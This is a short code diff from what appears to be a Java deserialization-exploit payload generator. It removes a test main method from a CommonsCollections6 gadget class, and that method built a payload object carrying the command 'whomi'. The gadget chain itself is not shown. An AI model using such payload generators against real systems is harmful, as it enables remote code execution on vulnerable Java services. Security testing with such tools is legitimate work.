@@ -85,10 +85,4 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
 
         return map;
     }
-
-    public static void main(String[] args) throws Exception {
-        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections6");
-        ObjectPayload                        payload      = payloadClass.newInstance();
-        Object                               object       = payload.getObject(PayloadType.qi4l,"whomi");
-    }
 }
